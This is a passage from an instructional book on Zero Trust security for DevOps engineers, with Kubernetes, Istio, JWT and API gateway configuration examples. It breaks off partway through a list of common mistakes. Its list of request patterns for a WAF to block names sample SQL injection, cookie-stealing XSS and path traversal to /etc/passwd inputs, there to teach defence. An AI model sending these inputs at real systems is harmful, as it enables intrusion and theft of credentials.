


# Zero Trust & Network Security
## A Comprehensive Learning Book for Cloud & DevOps Engineers
### From Beginner to Advanced

---

> **Who this book is for:** Cloud & DevOps engineers who want to understand, implement, and operate production-grade security systems. No prior security background is assumed — every concept is built from scratch.

---

## Table of Contents

1. [Introduction — Why Security is Not Optional](#introduction)
2. [Chapter 1 — Zero Trust Architecture](#chapter-1)
3. [Chapter 2 — Service Mesh Security](#chapter-2)
4. [Chapter 3 — API Gateway Security](#chapter-3)
5. [Chapter 4 — Cloud WAF](#chapter-4)
6. [Chapter 5 — DDoS Protection](#chapter-5)
7. [Chapter 6 — Private Networking](#chapter-6)
8. [Chapter 7 — SIEM Basics](#chapter-7)
9. [Chapter 8 — Penetration Testing Basics](#chapter-8)
10. [Chapter 9 — Compliance Frameworks](#chapter-9)
11. [Chapter 10 — Security Incident Response](#chapter-10)
12. [Final Chapter — Putting It All Together](#final-chapter)

---

## Introduction — Why Security is Not Optional {#introduction}

Imagine you built a house. You spent months on the interior — perfect flooring, beautiful walls, great lighting. But you left the front door unlocked, the windows open, and you gave a copy of your key to everyone who asked politely.

That is what most software systems look like without intentional security design.

This book is about closing those doors, locking those windows, and making sure that even people inside your house can only access the rooms they're supposed to.

### What You Will Learn

Over the next ten chapters, you will learn:

- How to design systems where nothing is trusted by default (Zero Trust)
- How to secure communication between your microservices (Service Mesh)
- How to protect the front door of your API (API Gateway Security)
- How to use cloud-native firewalls to block attacks before they reach your app (WAF)
- How to survive volumetric attacks that try to flood your infrastructure (DDoS Protection)
- How to keep your traffic off the public internet entirely (Private Networking)
- How to detect threats using logs and alerts (SIEM)
- How to think like an attacker to find your own weaknesses (Penetration Testing)
- How to meet legal and industry security requirements (Compliance)
- How to respond when something goes wrong — because it will (Incident Response)

### Why This Matters for DevOps Engineers

Security used to be someone else's job. There was a security team. You built things; they checked them. That model is gone.

In modern cloud-native teams, **you are the security team**. Infrastructure-as-code, CI/CD pipelines, Kubernetes clusters, and serverless functions are all yours to manage — and all yours to secure.

A single misconfigured S3 bucket has leaked millions of customer records. A single hardcoded secret in a GitHub repo has resulted in six-figure AWS bills. A single unpatched dependency has taken down Fortune 500 companies.

This is not about fear. It is about competence. By the end of this book, you will be able to design, implement, and operate security controls that real enterprises rely on.

Let's begin.

---

## Chapter 1 — Zero Trust Architecture {#chapter-1}

### The Old Way: Castle and Moat

For decades, network security followed a simple mental model: the castle and moat. You build a strong wall (firewall) around your network. Everything inside the wall is trusted. Everything outside is not.

This worked reasonably well when all your employees sat in one office, connected to one network, and your data lived on physical servers in a room down the hall.

But now consider the modern reality:

- Your developers work from coffee shops and home offices
- Your services run across multiple cloud accounts and regions
- Third-party contractors access your systems regularly
- Your "servers" are containers that spin up and down every few minutes
- Attackers who breach your perimeter once can move freely inside

The moat is no longer enough. In fact, the idea of a trusted "inside" is now one of the most dangerous assumptions you can make.

### The Zero Trust Model: Never Trust, Always Verify

Zero Trust is a security philosophy that starts with one radical idea: **trust nothing, verify everything — every time.**

It doesn't matter if a request comes from inside your network or outside. It doesn't matter if the requester used the right username and password. Every single request must prove who it is, what it is allowed to do, and that it hasn't been tampered with.

Think of it like a building where every room requires its own badge scan. Even if someone gets into the lobby by following someone through the front door, they still can't get into the server room, the HR office, or the executive floor without their own verified credentials.

### The Three Pillars of Zero Trust

#### 1. Never Trust, Always Verify

Every user, device, and service must authenticate and authorize every request. The source of the request — internal network, corporate VPN, cloud subnet — provides no trust by itself.

**In practice this means:**
- Mutual TLS (mTLS) between services so both sides prove identity
- Short-lived tokens (JWTs) instead of long-lived credentials
- Every API call carries proof of identity, not just a session cookie

#### 2. Microsegmentation

Traditional networks let everything inside talk to everything else. Microsegmentation means dividing your network into very small zones, each with its own access rules.

**Analogy:** Instead of one big open-plan office where anyone can walk to any desk, you have individual offices with locked doors. The accounting team can't walk into the engineering room without explicit permission.

**In practice this means:**
- Kubernetes NetworkPolicy rules that say "this pod can only talk to these pods"
- AWS Security Groups scoped to individual services, not broad subnets
- Service mesh authorization policies that enforce which services can call which

#### 3. Least Privilege

Every entity — user, service, process — should have the minimum permissions needed to do its job, and nothing more.

**Analogy:** A delivery driver has a key to your lobby but not to your apartment. A bank teller can access your account balance but cannot transfer funds without additional authorization.

**In practice this means:**
- IAM roles that allow only specific actions on specific resources
- Kubernetes RBAC that restricts pods to only the API endpoints they need
- Database users that can only read from specific tables

### Zero Trust in a Kubernetes Environment

Let's look at a real-world implementation. You have three services:

- `frontend` — serves the web UI
- `api` — handles business logic
- `database-service` — wraps your database

Without Zero Trust, all three can talk to each other freely. With Zero Trust:

```yaml
# NetworkPolicy: only allow api to talk to database-service
# All other traffic is denied
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: database-service-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database-service   # This policy applies to pods labelled app=database-service
  policyTypes:
    - Ingress                 # We are controlling who can SEND traffic IN
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: api        # Only pods labelled app=api are allowed in
      ports:
        - protocol: TCP
          port: 5432          # Only on the Postgres port
```

What this policy says in plain English: "The database-service pod will only accept incoming TCP connections on port 5432 from pods labelled `app: api`. All other incoming traffic — from `frontend`, from other services, from anywhere — is dropped."

**Line by line:**
- `podSelector.matchLabels.app: database-service` — this policy applies to the `database-service` pod
- `policyTypes: Ingress` — we're controlling incoming traffic
- `ingress.from.podSelector.matchLabels.app: api` — only the `api` pod is allowed to send traffic in
- `port: 5432` — only on this specific port (PostgreSQL's default)

Now add a policy for the `frontend`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: api-policy
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: api
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: frontend   # Only frontend can call the API
      ports:
        - protocol: TCP
          port: 8080
```

With both policies applied, even if an attacker compromises the `frontend` pod, they cannot directly reach the database. The blast radius is contained.

### Identity-Based Access: Moving Beyond IP Addresses

Traditional firewalls trust IP addresses. The problem: in cloud environments, IP addresses are dynamic. A pod that had IP `10.0.1.5` this morning might be gone by afternoon, replaced by a new pod with a different IP.

Zero Trust uses **identity** instead — cryptographic proof of who you are, not where you are.

In a service mesh (which we'll cover in Chapter 2), each service gets a cryptographic certificate. When Service A calls Service B, it presents this certificate. Service B verifies it cryptographically. The IP address is irrelevant.

This is called **Workload Identity**, and it's the foundation of true Zero Trust in microservice architectures.

### Implementing Zero Trust: The Practical Checklist

Here is what Zero Trust looks like in a real deployment:

```
✅ Authentication
   - All service-to-service calls use mTLS with short-lived certificates
   - All human access uses MFA
   - All API access uses short-lived JWTs (expiry: 15-60 minutes)

✅ Authorization  
   - Every resource has explicit allow rules
   - Default deny: if not explicitly allowed, it's blocked
   - Permissions are scoped to minimum required

✅ Microsegmentation
   - NetworkPolicies in Kubernetes
   - Security Groups scoped per service (not per subnet)
   - Service mesh authorization policies

✅ Observability
   - All access attempts are logged (success AND failure)
   - Anomalous access patterns trigger alerts
   - Regular access reviews happen on a schedule
```

### Common Mistakes Beginners Make

**Mistake 1: Treating Zero Trust as a product you buy**

Zero Trust is a philosophy and architecture approach, not a single tool. Companies sell "Zero Trust solutions," but you cannot purchase your way to Zero Trust. It requires deliberate design decisions across your entire stack.

**Mistake 2: Implementing Zero Trust at the perimeter only**

If you put a Zero Trust gateway at your network edge but let everything inside communicate freely, you've accomplished very little. Zero Trust must be applied at every layer.

**Mistake 3: Starting with too much complexity**

Engineers sometimes try to implement every Zero Trust principle on day one. Start with the highest-risk attack paths. Add microsegmentation to your most sensitive services first. Expand from there.

**Mistake 4: Forgetting service accounts**

Human users are only part of the picture. Service accounts — the identities used by automated processes and applications — are often far more permissive than necessary. An overprivileged CI/CD pipeline service account is just as dangerous as an overprivileged admin user.

### How This Works in the Real World

Large enterprises implement Zero Trust over months or years as a phased migration. A typical roadmap:

**Phase 1 (months 1–3):** Inventory all services and their communication patterns. Understand what talks to what.

**Phase 2 (months 3–6):** Implement identity for workloads. Deploy a service mesh with mTLS. Begin issuing workload certificates.

**Phase 3 (months 6–12):** Apply microsegmentation. Start with deny-all and add explicit allow rules. Run in audit/logging mode first to understand what you'd break.

**Phase 4 (ongoing):** Continuously reduce permissions through access reviews. Automate detection of privilege creep.

Companies like Google, Netflix, and Cloudflare have published extensively about their Zero Trust implementations. Google's "BeyondCorp" initiative is the most famous — it eliminated VPN access entirely, replacing it with context-aware access based on device health, user identity, and request context.

### Practical Task — Chapter 1

**Task:** Deploy Istio, enable strict mTLS across all services, configure authorization policies.

**Context:** You have a three-tier application: `frontend`, `api`, and `backend`. You will implement Zero Trust between all three layers using Istio.

**Step 1: Install Istio**

```bash
# Download Istio CLI
curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.20.0 sh -

# Add to PATH
export PATH=$PWD/istio-1.20.0/bin:$PATH

# Install Istio with the default profile
istioctl install --set profile=default -y

# Verify Istio is running
kubectl get pods -n istio-system
# Expected output: istiod, istio-ingressgateway pods running
```

**Step 2: Enable sidecar injection for your namespace**

```bash
# Label the namespace — Istio will automatically inject the Envoy sidecar
# into every pod in this namespace
kubectl label namespace production istio-injection=enabled

# Verify the label was applied
kubectl get namespace production --show-labels
```

**Step 3: Enable strict mTLS**

```yaml
# strict-mtls.yaml
# This PeerAuthentication policy enforces mTLS mode: STRICT
# STRICT means: ALL communication in this namespace MUST use mTLS
# Any plaintext traffic will be REJECTED
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT    # Alternatives: PERMISSIVE (allow both), DISABLE (no mTLS)
```

```bash
kubectl apply -f strict-mtls.yaml
```

**Step 4: Configure Authorization Policies**

```yaml
# authz-api.yaml
# This AuthorizationPolicy says:
# The 'api' service will ONLY accept requests from the 'frontend' service
# All other requests are denied
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: api-authz
  namespace: production
spec:
  selector:
    matchLabels:
      app: api              # Apply to pods labelled app=api
  action: ALLOW             # When conditions match, ALLOW the request
  rules:
    - from:
        - source:
            principals:
              # This is the service account identity in mTLS
              # Format: cluster.local/ns/<namespace>/sa/<service-account>
              - "cluster.local/ns/production/sa/frontend"
      to:
        - operation:
            methods: ["GET", "POST"]   # Only these HTTP methods are allowed
            paths: ["/api/*"]          # Only these URL paths
```

```yaml
# authz-backend.yaml
# Backend service only accepts traffic from api
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: backend-authz
  namespace: production
spec:
  selector:
    matchLabels:
      app: backend
  action: ALLOW
  rules:
    - from:
        - source:
            principals:
              - "cluster.local/ns/production/sa/api"
```

```bash
kubectl apply -f authz-api.yaml
kubectl apply -f authz-backend.yaml
```

**Step 5: Verify mTLS is working**

```bash
# Check the mTLS status between services
istioctl x authz check <pod-name> -n production

# View the traffic flow and mTLS status in Kiali (Istio's dashboard)
istioctl dashboard kiali

# Test that unauthorized access is blocked
# Try to call api from a pod that is NOT frontend — should get 403 Forbidden
kubectl run test-pod --image=curlimages/curl -n production --rm -it \
  -- curl http://api:8080/api/users
# Expected: RBAC: access denied
```

**Step 6: Verify the setup**

```bash
# List all PeerAuthentication policies
kubectl get peerauthentication -n production

# List all AuthorizationPolicies
kubectl get authorizationpolicies -n production

# Check Istio proxy status for all pods
istioctl proxy-status
```

**What Success Looks Like:**
- All pods show `SYNCED` in proxy-status
- Direct calls between non-authorized services return 403
- Authorized calls between services succeed with mTLS (visible in Kiali as padlock icons)
- `istioctl authn tls-check` shows `OK` for all service pairs

### Chapter 1 Summary

- **Zero Trust** is a philosophy: never grant access based on network location alone
- **Never Trust, Always Verify** means every request must authenticate and authorize, every time
- **Microsegmentation** limits blast radius by restricting what can talk to what
- **Least Privilege** means minimum permissions for every identity — human or machine
- **Workload Identity** replaces IP-based trust with cryptographic identity
- **NetworkPolicies** in Kubernetes implement microsegmentation at the network layer
- **Service meshes** (like Istio) implement Zero Trust at the application layer via mTLS and authorization policies

---

## Chapter 2 — Service Mesh Security {#chapter-2}

### What is a Service Mesh?

Picture a busy office building where hundreds of employees need to talk to each other constantly. You could let each person figure out their own way to communicate — walk over, phone, email. Or you could install a sophisticated communication infrastructure: a building-wide intercom system that logs every call, encrypts every conversation, and requires each person to badge in before they can call anyone.

A **service mesh** is that communication infrastructure for your microservices.

At its core, a service mesh works by deploying a small proxy — called a **sidecar** — alongside every service in your cluster. Instead of services talking directly to each other, they talk through their local sidecar proxy. All the proxies form a "mesh" of controlled, observable, policy-enforced communication.

The most popular service mesh is **Istio**, which uses **Envoy** as its sidecar proxy.

### The Architecture: Control Plane and Data Plane

A service mesh has two parts:

**Data Plane:** The sidecar proxies (Envoy) sitting next to each service. They handle the actual traffic — routing, encryption, retries, metrics collection.

**Control Plane (Istiod):** The brain of the mesh. It distributes configuration and certificates to all the Envoy sidecars. When you apply a policy, Istiod translates it and pushes the configuration to every relevant proxy.

```
┌─────────────────────────────────────────────┐
│                 Control Plane               │
│   ┌──────────────────────────────────────┐  │
│   │         Istiod (Pilot, Citadel)      │  │
│   │  - Issues certificates               │  │
│   │  - Pushes routing configs            │  │
│   │  - Distributes policies              │  │
│   └──────────────────────────────────────┘  │
└─────────────────────────────────────────────┘
              │            │
              ▼            ▼
┌─────────────────┐  ┌─────────────────┐
│  Frontend Pod   │  │   API Pod       │
│ ┌─────────────┐ │  │ ┌─────────────┐ │
│ │ App         │ │  │ │ App         │ │
│ │   ↕         │ │  │ │   ↕         │ │
│ │ Envoy       │◄├──┤►│ Envoy       │ │
│ │ (sidecar)   │ │  │ │ (sidecar)   │ │
│ └─────────────┘ │  │ └─────────────┘ │
└─────────────────┘  └─────────────────┘
```

When Frontend calls API, the actual path is:
`Frontend App → Frontend Envoy → API Envoy → API App`

Both Envoys handle authentication, authorization, encryption, and telemetry — your app code doesn't need to implement any of this.

### Mutual TLS (mTLS): Both Sides Prove Identity

Regular TLS (what HTTPS uses) is one-directional: the server proves its identity to the client. Your browser verifies that google.com is really Google.

**Mutual TLS** goes both ways: the server AND the client both prove their identity. This is critical for microservices because you don't want just any client to be able to call your payment service.

**How Istio mTLS Works:**

1. Istiod acts as a Certificate Authority (CA). It issues a short-lived X.509 certificate to every service (every Envoy sidecar).
2. These certificates encode the service's identity as a SPIFFE (Secure Production Identity Framework for Everyone) URI: `spiffe://cluster.local/ns/production/sa/api`
3. When Service A calls Service B, both Envoy proxies perform a TLS handshake. Each presents its certificate. Each verifies the other's certificate against the Istio CA.
4. If both certificates are valid and issued by the trusted CA, the connection is established. Otherwise, it's rejected.

```yaml
# PeerAuthentication: controls HOW services receive connections
# STRICT mode: reject all non-mTLS traffic
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT
    # PERMISSIVE: accept both mTLS and plaintext (use during migration)
    # STRICT: accept ONLY mTLS
    # DISABLE: no mTLS (not recommended for production)
```

**PERMISSIVE mode is useful during migration:** When you first install Istio, you can run in PERMISSIVE mode, which accepts both encrypted and unencrypted traffic. This allows you to migrate services gradually without downtime. Once all services are in the mesh, switch to STRICT.

### Authorization Policies: Who Can Call Whom

Even with mTLS ensuring that all traffic is encrypted and both sides are authenticated, you still need to control what each service is allowed to do. Authorization policies define the rules.

**Layer 1: Service-level authorization (who can call this service)**

```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-service-authz
  namespace: production
spec:
  selector:
    matchLabels:
      app: payment-service    # This policy applies to the payment service
  action: ALLOW
  rules:
    - from:
        - source:
            # Only allow requests from these specific service accounts
            principals:
              - "cluster.local/ns/production/sa/checkout-service"
              - "cluster.local/ns/production/sa/refund-service"
      to:
        - operation:
            # And only to these paths
            paths: ["/payment/*", "/refund/*"]
            methods: ["POST"]
      when:
        # And only when the JWT contains this claim
        # (we'll add JWT validation next)
        - key: request.auth.claims[iss]
          values: ["https://accounts.mycompany.com"]
```

**Layer 2: JWT Validation — verifying human identity**

When a human user makes a request, it arrives with a JWT (JSON Web Token) that says who they are. Istio can validate this token without your application code needing to do it.

```yaml
# RequestAuthentication: validates JWTs in incoming requests
apiVersion: security.istio.io/v1beta1
kind: RequestAuthentication
metadata:
  name: api-jwt-auth
  namespace: production
spec:
  selector:
    matchLabels:
      app: api
  jwtRules:
    - issuer: "https://accounts.mycompany.com"
      # Istio will fetch the public keys from this URL to verify JWTs
      jwksUri: "https://accounts.mycompany.com/.well-known/jwks.json"
      # The JWT must be in the Authorization header as a Bearer token
      forwardOriginalToken: true   # Pass the JWT to your app too
```

After applying this, Istio rejects any request to the `api` service that has an invalid or missing JWT. Your application doesn't need to verify the token — Istio does it at the proxy layer.

**Combining JWT validation with service authorization:**

```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: api-combined-authz
  namespace: production
spec:
  selector:
    matchLabels:
      app: api
  action: ALLOW
  rules:
    # Rule 1: Internal service calls (no JWT needed, but mTLS required)
    - from:
        - source:
            principals: ["cluster.local/ns/production/sa/frontend"]
    # Rule 2: Human user requests via ingress (JWT required)
    - from:
        - source:
            requestPrincipals: ["https://accounts.mycompany.com/*"]
      when:
        - key: request.auth.claims[role]
          values: ["admin", "user"]
```

### Envoy RBAC: Fine-Grained Authorization at the Proxy Level

Envoy (the proxy underlying Istio) has its own RBAC system that authorization policies compile down to. Understanding it helps you debug complex scenarios.

When you apply an AuthorizationPolicy, Istiod translates it into Envoy RBAC filter configuration and distributes it to the relevant Envoy proxies. You can inspect the resulting Envoy configuration:

```bash
# View the compiled Envoy configuration for the api pod
istioctl proxy-config listener <api-pod-name> -n production

# View specifically the RBAC filter
istioctl proxy-config listener <api-pod-name> -n production -o json | \
  jq '.[] | select(.name == "virtualOutbound") | .filterChains'
```

### Traffic Management with Security in Mind

Service meshes also give you traffic management capabilities that have security implications:

**Circuit Breaking:** Prevents a failing service from taking down its callers:

```yaml
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: api-circuit-breaker
  namespace: production
spec:
  host: api.production.svc.cluster.local
  trafficPolicy:
    outlierDetection:
      consecutive5xxErrors: 5         # After 5 consecutive 5xx responses...
      interval: 10s                   # ...in a 10-second window...
      baseEjectionTime: 30s           # ...eject the instance for 30 seconds
      maxEjectionPercent: 50          # Never eject more than 50% of instances
```

**Retry Policy:** Automatically retries failed requests (with limits to prevent amplification attacks):

```yaml
apiVersion: networking.istio.io/v1beta1
kind: VirtualService
metadata:
  name: api-vs
  namespace: production
spec:
  hosts:
    - api.production.svc.cluster.local
  http:
    - retries:
        attempts: 3              # Retry up to 3 times
        perTryTimeout: 2s        # Each attempt has a 2-second timeout
        retryOn: "5xx,reset"     # Only retry on server errors or connection resets
        retryRemoteLocalities: true
```

### Common Mistakes Beginners Make

**Mistake 1: Switching to STRICT mTLS immediately**

If you have services that communicate outside the mesh (external dependencies, legacy services), switching to STRICT immediately will break them. Always use PERMISSIVE mode first, observe traffic, then migrate to STRICT.

**Mistake 2: Forgetting the default-deny AuthorizationPolicy**

Without an AuthorizationPolicy, Istio allows all traffic that passes mTLS. You need to explicitly create a deny-all policy and then add specific allows:

```yaml
# First: create a deny-all policy for the namespace
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: deny-all
  namespace: production
spec: {}   # Empty spec = deny everything
  # Then add specific allow policies for each service
```

**Mistake 3: Using service names instead of SPIFFE URIs in policies**

Authorization policies should reference service account identities (SPIFFE URIs), not service names or IP addresses. Names can be spoofed; cryptographic identities cannot.

**Mistake 4: Not testing the deny path**

After applying authorization policies, test that unauthorized access is actually denied. Many engineers apply policies but never verify the deny path works correctly.

### How This Works in the Real World

Istio or similar service meshes (Linkerd, Consul Connect) are now standard in large Kubernetes deployments. Use cases include:

**Financial Services:** A bank's payment processing cluster uses strict mTLS and authorization policies to ensure that only the checkout service can initiate payments. The policies are defined in code (GitOps) and reviewed during security audits.

**Healthcare:** A health records platform uses JWT validation at the service mesh layer to ensure that requests to patient data endpoints carry valid clinician tokens with the appropriate scope.

**E-commerce:** A retail platform uses Istio's traffic management to canary-deploy new versions of services while maintaining the same security policies across old and new versions.

### Practical Task — Chapter 2

*(This is the same as the Chapter 1 task — both build toward the same deliverable. Your Chapter 1 task deployed Istio with basic mTLS. This chapter's deeper work extends that with JWT validation and more granular policies.)*

**Extended Task: Add JWT validation and test authorization**

**Step 1: Apply a RequestAuthentication for JWT validation**

```yaml
# jwt-auth.yaml
apiVersion: security.istio.io/v1beta1
kind: RequestAuthentication
metadata:
  name: frontend-jwt
  namespace: production
spec:
  selector:
    matchLabels:
      app: api
  jwtRules:
    - issuer: "testing@secure.istio.io"
      # For testing, we use Istio's built-in test JWT key
      jwksUri: "https://raw.githubusercontent.com/istio/istio/release-1.20/security/tools/jwt/samples/jwks.json"
```

```bash
kubectl apply -f jwt-auth.yaml
```

**Step 2: Test with valid and invalid tokens**

```bash
# Get a valid test JWT from Istio's sample tools
TOKEN=$(curl -s https://raw.githubusercontent.com/istio/istio/release-1.20/security/tools/jwt/samples/demo.jwt)

# Test with valid token — should succeed (200)
kubectl exec -it <frontend-pod> -n production -c frontend -- \
  curl http://api:8080/api/users \
  -H "Authorization: Bearer $TOKEN"

# Test with invalid token — should fail (401)
kubectl exec -it <frontend-pod> -n production -c frontend -- \
  curl http://api:8080/api/users \
  -H "Authorization: Bearer invalid.token.here"

# Test with no token — should fail (401) if you also have an AuthorizationPolicy
# requiring requestPrincipals
kubectl exec -it <frontend-pod> -n production -c frontend -- \
  curl http://api:8080/api/users
```

**Step 3: Verify the mTLS connection details**

```bash
# Check TLS mode between all service pairs
istioctl authn tls-check <frontend-pod>.<namespace> api.<namespace>.svc.cluster.local

# Expected output shows: OK   mTLS   STRICT
```

### Chapter 2 Summary

- A **service mesh** deploys a sidecar proxy (Envoy) next to each service, forming a controlled communication layer
- **Mutual TLS (mTLS)** ensures both caller and callee prove their cryptographic identity before communicating
- **Istio's control plane (Istiod)** acts as a CA, issues certificates, and distributes configuration to all proxies
- **PeerAuthentication** controls how services receive connections (STRICT, PERMISSIVE, DISABLE)
- **AuthorizationPolicy** defines which services can call which services, and under what conditions
- **RequestAuthentication** validates JWTs at the proxy layer, removing that burden from your application
- **PERMISSIVE mode** is your migration friend — use it during rollout, then switch to STRICT
- Always test the **deny path** to confirm your policies actually reject unauthorized traffic

---

## Chapter 3 — API Gateway Security {#chapter-3}

### What is an API Gateway?

Think of your application's API as a nightclub. Without a doorman, anyone can walk in — potentially causing trouble, overwhelming the bar, or sneaking into the VIP section. An **API gateway** is your doorman, bouncer, and VIP list all rolled into one.

Every request to your application comes through the gateway first. It checks credentials, enforces limits, blocks known threats, and routes legitimate requests to the right service.

Popular API gateways include **AWS API Gateway**, **Kong**, **NGINX**, **Traefik**, and **Apigee**. They all solve the same set of problems:

- Authentication: Is this caller who they say they are?
- Authorization: Is this caller allowed to do what they're asking?
- Rate Limiting: Is this caller being too aggressive?
- Threat Protection: Is this request attempting to exploit a vulnerability?
- Routing: Which backend service should handle this request?

### Rate Limiting: Protecting Against Abuse and DoS

**The problem:** Without limits, a single poorly-coded client can overwhelm your API with thousands of requests per second. Whether accidental (infinite retry loops) or malicious (denial of service), the result is the same: your service becomes unavailable for legitimate users.

**Rate limiting** restricts how many requests a client can make in a time window.

**Types of rate limiting:**

```
Per-IP rate limiting:     100 requests/minute per source IP
Per-user rate limiting:   1000 requests/day per authenticated user
Global rate limiting:     10,000 requests/minute total across all clients
Per-endpoint limiting:    10 requests/minute to /api/login (anti-brute-force)
```

**Implementation on AWS API Gateway:**

```yaml
# AWS API Gateway usage plan with throttling
# This is defined via CloudFormation/Terraform
Resources:
  ApiUsagePlan:
    Type: AWS::ApiGateway::UsagePlan
    Properties:
      UsagePlanName: StandardTier
      Throttle:
        # BurstLimit: maximum requests at once (short spike)
        BurstLimit: 200
        # RateLimit: sustained requests per second
        RateLimit: 100
      Quota:
        # Maximum total requests per month per API key
        Limit: 1000000
        Period: MONTH
```

**Implementation at CloudFront (CDN/Global layer):**

CloudFront doesn't have built-in rate limiting in the traditional sense, but you can use **AWS WAF** (which we cover in Chapter 4) attached to CloudFront to rate limit by IP:

```json
{
  "Name": "RateLimitRule",
  "Priority": 1,
  "Statement": {
    "RateBasedStatement": {
      "Limit": 1000,
      "AggregateKeyType": "IP",
      "EvaluationWindowSec": 300
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "RateLimitRule"
  }
}
```

This rule says: if a single IP makes more than 1000 requests in a 5-minute window, block it.

### OAuth2 and OIDC: The Standard for API Authentication

**The problem:** How does your API know that the request claiming to be from User X is actually from User X, and not someone pretending to be them?

Handing your username and password to every API you use is dangerous (if one API is compromised, they have your credentials for everything). **OAuth2** solves this with a token-based delegation model.

**The OAuth2 flow in simple terms:**

1. User wants to access a service
2. Service redirects user to an **Authorization Server** (e.g., Auth0, Okta, AWS Cognito, your own Keycloak instance)
3. User logs in at the Authorization Server
4. Authorization Server issues a short-lived **Access Token** (JWT) to the service
5. Service includes this token in every API request
6. API gateway verifies the token before forwarding the request

```
User Browser          Your App         Auth Server (Cognito)      Your API
     │                    │                     │                     │
     │  1. Click Login     │                     │                     │
     │───────────────────►│                     │                     │
     │                    │  2. Redirect to AS  │                     │
     │◄───────────────────│                     │                     │
     │  3. Login page      │                     │                     │
     │────────────────────────────────────────►│                     │
     │  4. Enter creds     │                     │                     │
     │────────────────────────────────────────►│                     │
     │  5. Auth code       │                     │                     │
     │◄────────────────────────────────────────│                     │
     │  6. Code to app     │                     │                     │
     │───────────────────►│                     │                     │
     │                    │  7. Exchange code   │                     │
     │                    │────────────────────►│                     │
     │                    │  8. Access Token    │                     │
     │                    │◄────────────────────│                     │
     │                    │  9. API call + Token│                     │
     │                    │─────────────────────────────────────────►│
     │                    │  10. Response        │                     │
     │◄───────────────────────────────────────────────────────────────│
```

**JWT Structure:**

A JWT (JSON Web Token) is a base64-encoded, signed string with three parts separated by dots:

```
header.payload.signature

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiJ1c2VyMTIzIiwibmFtZSI6IkphbmUgRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA5MjUwMDAwLCJleHAiOjE3MDkyNTM2MDB9.
[signature]
```

Decoded payload:
```json
{
  "sub": "user123",           // Subject: who this token is for
  "name": "Jane Doe",         // Custom claim: user's display name
  "role": "admin",            // Custom claim: user's role
  "iat": 1709250000,          // Issued at: Unix timestamp
  "exp": 1709253600           // Expires at: 1 hour after issue
}
```

**Verifying JWTs at the API Gateway:**

```python
# Example: API Gateway Lambda Authorizer that validates JWTs
import jwt
import json
import urllib.request

def lambda_handler(event, context):
    token = event['authorizationToken'].replace('Bearer ', '')
    
    # Fetch the public keys from the Authorization Server
    # (These are used to verify the token's signature)
    jwks_url = 'https://cognito-idp.us-east-1.amazonaws.com/us-east-1_abc123/.well-known/jwks.json'
    with urllib.request.urlopen(jwks_url) as response:
        jwks = json.loads(response.read())
    
    try:
        # Verify the token:
        # 1. Signature is valid (signed by the Auth Server's private key)
        # 2. Token has not expired
        # 3. Audience matches our API
        decoded = jwt.decode(
            token,
            jwks,                          # Public keys to verify signature
            algorithms=['RS256'],           # Expected signing algorithm
            audience='my-api-audience',     # Token must be intended for us
            issuer='https://cognito-idp.us-east-1.amazonaws.com/us-east-1_abc123'
        )
        
        # Generate IAM policy to allow access
        return generate_policy(decoded['sub'], 'Allow', event['methodArn'])
    
    except jwt.ExpiredSignatureError:
        return generate_policy('user', 'Deny', event['methodArn'])
    except jwt.InvalidTokenError:
        return generate_policy('user', 'Deny', event['methodArn'])

def generate_policy(principal_id, effect, resource):
    return {
        'principalId': principal_id,
        'policyDocument': {
            'Version': '2012-10-17',
            'Statement': [{
                'Action': 'execute-api:Invoke',
                'Effect': effect,       # 'Allow' or 'Deny'
                'Resource': resource    # The API endpoint being requested
            }]
        }
    }
```

### API Key Management

For server-to-server API access (machine clients, not human users), API keys are a simpler alternative to OAuth2. The critical security principles:

**Never hardcode API keys in source code.** They will end up in your git history and will eventually be exposed.

**Rotate keys regularly.** Old keys should expire. New keys should be issued without downtime.

**Scope keys to minimum permissions.** A key used for read-only reporting should not have write permissions.

**Example: API Key rotation without downtime using AWS API Gateway**

```bash
# Create a new API key
NEW_KEY_ID=$(aws apigateway create-api-key \
  --name "service-b-key-v2" \
  --enabled \
  --query 'id' --output text)

# Associate it with the usage plan
aws apigateway create-usage-plan-key \
  --usage-plan-id <your-usage-plan-id> \
  --key-id $NEW_KEY_ID \
  --key-type API_KEY

# At this point, both old and new keys work.
# Update service-b to use the new key.
# Verify service-b is working with the new key.
# Then delete the old key:
aws apigateway delete-api-key --api-key <old-key-id>
```

### Web Application Firewall (WAF) at the API Layer

We'll cover WAF in detail in Chapter 4, but at the API gateway level, you want basic WAF protection to block common attack patterns. Modern gateways like AWS API Gateway can be fronted by AWS WAF, which inspects requests before they reach your gateway logic.

Key patterns to block at the gateway:
- SQL injection in query parameters: `?id=1 OR 1=1`
- XSS in request bodies: `<script>document.cookie</script>`
- Path traversal: `../../etc/passwd`
- Oversized payloads (memory exhaustion): requests larger than 10MB

### Common Mistakes Beginners Make

**Mistake 1: Using HTTP instead of HTTPS**

Your API gateway should only accept HTTPS connections. HTTP sends all data — including tokens and credentials — in plaintext, visible to any network observer. Force HTTPS redirect at the gateway and reject HTTP entirely.

**Mistake 2: Long-lived tokens**

